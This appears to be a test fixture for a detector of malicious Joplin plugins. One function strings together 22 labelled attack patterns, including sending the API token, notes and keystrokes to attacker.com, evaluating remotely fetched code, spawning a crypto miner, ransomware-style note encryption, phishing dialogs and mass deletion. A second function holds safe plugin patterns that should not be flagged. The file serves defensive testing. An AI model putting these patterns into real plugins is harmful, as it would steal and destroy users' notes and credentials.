// Mock dependencies to avoid TS errors
const joplin = require('api');
const axios = require('axios');
const cp = require('child_process');
const net = require('net');
const crypto = require('crypto');
const electron = require('electron');

async function triggerAllVulnerabilities() {
    const fs = joplin.require('fs-extra');
    const directCp = require('child_process');
    const axios = require('axios');
    const myCrypto = require('crypto');
    const net = require('net');
    const app = require('electron').app;

    // 01. Dynamic Code Execution
    const dynCode = await axios.get('http://a');
    eval(dynCode.data);

    // 02. Secret Key Theft (needs globalValue('api.token') -> fetch)
    const token = await joplin.settings.globalValue('api.token');
    fetch('http://attacker.com/?t=' + token);

    // 03. Unauthorized FS Access (__dirname -> writeFileSync)
    const fsNative = require('fs');
    const fsEx = joplin.require('fs-extra');
    const myDir = __dirname;
    fsNative.writeFileSync(myDir, 'payload');
    fsNative.writeFileSync(fsEx, 'payload');
    fsNative.writeFileSync(app.getPath('userData'), 'payload');

    // 04. Network Backdoor
    net.createServer().listen(1337);

    // 05. Clipboard Hijacking (clipboard read -> fetch)
    const clipVal = joplin.clipboard.readText();
    fetch(clipVal);
    const fetchClip = await fetch('http://attacker.com/clip');
    joplin.clipboard.writeText(fetchClip);

    // 06. Cryptojacking
    directCp.spawn('./xmrig', []);

    // 07. Command Execution
    directCp.exec('echo pwned');

    // 08. Data Exfiltration (joplin.data.get -> fetch)
    const notes = await joplin.data.get(['notes']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(notes) });

    // 09. Ransomware
    const cipher = myCrypto.createCipheriv('aes', 'key', 'iv');
    const noteToEncrypt = await joplin.data.get(['notes', '1']);
    const encryptedBody = cipher.update(noteToEncrypt.body, 'utf8', 'hex') + cipher.final('hex');
    await joplin.data.put(['notes', '1'], null, { body: encryptedBody });

    // 10. Silent Backup Hijacking (registerExportModule -> fetch)
    joplin.interop.registerExportModule({
        onExec: async (context) => {
            fetch('http://attacker.com/?data=' + context.destPath);
        }
    });

    // 11. Remote Webview Scripts (joplin.views.panels.setHtml -> script src)
    const panel = await joplin.views.panels.create('panel1');
    await joplin.views.panels.setHtml(panel, '<script src="http://attacker.com/hook.js"></script>');

    // 12. Sync Smuggling (joplin.data.get -> userDataSet)
    const smugData = await joplin.data.get(['notes']);
    await joplin.data.userDataSet(smugData);

    // 13. UI Phishing (dialogs.open -> fetch via formData)
    await joplin.views.dialogs.setHtml('phish', '<input type="password">');
    const phishData = await joplin.views.dialogs.open('phish');
    fetch(phishData.formData);

    // 14. Tag Flooding (setInterval -> joplin.data.post(['tags']))
    setInterval(() => {
        joplin.data.post(['tags'], null, { title: 'spam' });
    }, 1000);

    // 15. Semantic Sabotage (onNoteChange -> joplin.data.put(['notes']))
    await joplin.workspace.onNoteChange(() => {
        joplin.data.put(['notes', '1'], null, { body: 'sabotaged' });
    });

    // 16. Resource Exhaustion (setInterval -> joplin.data.post(['resources']))
    setInterval(() => {
        joplin.data.post(['resources'], null, { id: 'spam' });
    }, 1000);

    // 17. Electron Main Process Takeover
    require('@electron/remote').app.quit();

    // 18. Archive Extraction Attack
    await joplin.fs.archiveExtract('malicious.zip', '/dest');

    // 19. Mass Data Destruction (loop -> joplin.data.delete)
    while (true) {
        await joplin.data.delete(['notes', '1']);
    }

    // 20. Keylogging & Silent Surveillance (onNoteContentChange with fetch inside)
    joplin.workspace.onNoteContentChange((noteEvent) => {
        fetch('http://attacker.com/?k=' + noteEvent);
    });

    // 21. Native Module Imports
    require('child_process').exec('bypass');

    // 22. Malicious Import Module
    joplin.interop.registerImportModule({ onExec: (context) => { fetch('http://attacker.com/steal?data=' + context); } });
}

// ==========================================
// MOCK SAFE PLUGINS (Should NOT trigger vulnerabilities)
// ==========================================

async function mockSafePlugins() {
    // 1. joplin-exports-to-ssg
    const fs = joplin.require('fs-extra');
    const path = require('path');
    const dest = '/mock/dest';
    await fs.mkdirp(path.join(dest, 'content'));
    fs.copy('/mock/src', dest);

    // 2. joplin-note-statistics
    const note = await joplin.workspace.selectedNote();
    const words = note.body.split(' ').length;
    await joplin.views.dialogs.setHtml('handle', `<p>Words: ${words}</p>`);

    // 3. joplin-plugin-fold-cm
    await joplin.contentScripts.register('CodeMirrorPlugin', 'folding', './folding.js');
    await joplin.commands.register({
        name: 'foldAll',
        execute: async () => {
            await joplin.commands.execute('editor.execCommand', { name: 'foldAll' });
        }
    });

    // 4. joplin-plugin-jira-issue
    const host = await joplin.settings.value('jiraHost');
    const password = await joplin.settings.value('password');
    await axios.get(host + '/rest/api/latest/issue', {
        headers: { Authorization: 'Bearer ' + password }
    });

    // 5. joplin-quick-move
    const noteIds = await joplin.workspace.selectedNoteIds();
    for (const id of noteIds) {
        await joplin.data.put(['notes', id], null, { parent_id: 'mock-folder' });
    }
}
